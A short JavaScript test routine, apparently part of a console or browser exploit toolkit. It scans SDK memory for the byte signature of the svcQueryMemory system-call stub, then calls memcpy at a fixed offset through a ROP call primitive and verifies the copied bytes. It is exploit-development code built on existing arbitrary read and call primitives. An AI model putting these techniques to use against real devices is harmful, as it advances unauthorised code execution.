(async function () {
  const source = malloc(64), destination = malloc(64);
  if (!source || !destination) { await log('call6-memcpy: allocation failed'); return; }
  try {
    const expected = Uint8Array.from({length: 64}, (_, index) => index ^ 0xa5);
    write_buffer(source, expected);
    let qm = 0n, previousHigh = 0n;
    for (let address = sdk_base; address < sdk_base + 0x5F0000n; address += 8n) {
      const pair = read64(address), low = pair & 0xFFFFFFFFn, high = pair >> 32n;
      if (low === 0xF81F0FE1n && high === 0xD40000C1n) { qm = address; break; }
      if (previousHigh === 0xF81F0FE1n && low === 0xD40000C1n) { qm = address - 4n; break; }
      previousHigh = high;
    }
    if (!qm) { await log('call6-memcpy: svcQueryMemory not found'); return; }
    const aux = malloc(0x100);
    if (!aux) { await log('call6-memcpy: query allocation failed'); return; }
    let sdk;
    try {
      const result = call_rop(qm, aux, aux + 0x40n, sdk_base);
      if (result !== 0n) { await log('call6-memcpy: SDK query failed'); return; }
      sdk = read64(aux);
    } finally {
      free(aux);
    }
    const result = call_rop(sdk + 0x5224E0n, destination, source, 64n, 0n, 0n, 0n);
    const actual = read_buffer(destination, 64);
    const matches = actual.every((value, index) => value === expected[index]);
    await log(JSON.stringify({result: '0x' + result.toString(16), destination: '0x' + destination.toString(16), matches}));
  } finally {
    free(source);
    free(destination);
  }
})();
